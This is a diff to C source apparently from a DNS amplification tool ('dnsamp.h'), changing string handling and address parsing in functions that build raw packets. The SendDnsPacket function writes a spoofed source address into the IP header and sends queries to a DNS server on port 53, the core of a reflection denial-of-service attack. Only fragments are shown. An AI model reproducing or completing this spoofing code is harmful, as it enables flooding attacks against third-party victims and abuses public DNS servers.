@@ -1,7 +1,7 @@
 #include "dnsamp.h"
 
-void PrintError(string error){
-	cerr<<error<<endl;
+void PrintError(char *error){
+	printf("%s\n", error);
 	exit(-1);
 }
 
@@ -61,7 +61,7 @@ unsigned short CheckIpSum(int size, unsigned short *ptr){
 	return (unsigned short)~cksum;
 }
 
-void SendDnsPacket(string dnsip, string spoofip, int port){
+void SendDnsPacket(char* dnsip, char* spoofip, int port){
 	int sd;
 	char buf[PACKET_LENGTH];
 	memset(buf, 0, PACKET_LENGTH);
@@ -83,8 +83,8 @@ void SendDnsPacket(string dnsip, string spoofip, int port){
 	din.sin_family = AF_INET;
 	sin.sin_port = htons(port);
 	din.sin_port = htons(53);
-	sin.sin_addr.s_addr = inet_addr(spoofip.c_str());
-	din.sin_addr.s_addr = inet_addr(dnsip.c_str());
+	inet_pton(AF_INET, spoofip, &sin.sin_addr.s_addr);
+	inet_pton(AF_INET, dnsip, &din.sin_addr.s_addr);
 
 	ipheader->ihl = 5;
 	ipheader->version = 4;
@@ -93,8 +93,8 @@ void SendDnsPacket(string dnsip, string spoofip, int port){
 	ipheader->id = htons(QUERY_ID);
 	ipheader->ttl = 64;
 	ipheader->protocol = IPPROTO_UDP;
-	ipheader->saddr = inet_addr(spoofip.c_str());
-	ipheader->daddr = inet_addr(dnsip.c_str());
+	inet_pton(AF_INET, spoofip, &ipheader->saddr);
+	inet_pton(AF_INET, dnsip, &ipheader->daddr);
 	ipheader->check = 0;
 	ipheader->check = CheckIpSum(ipheader->tot_len, (unsigned short *)buf);
 
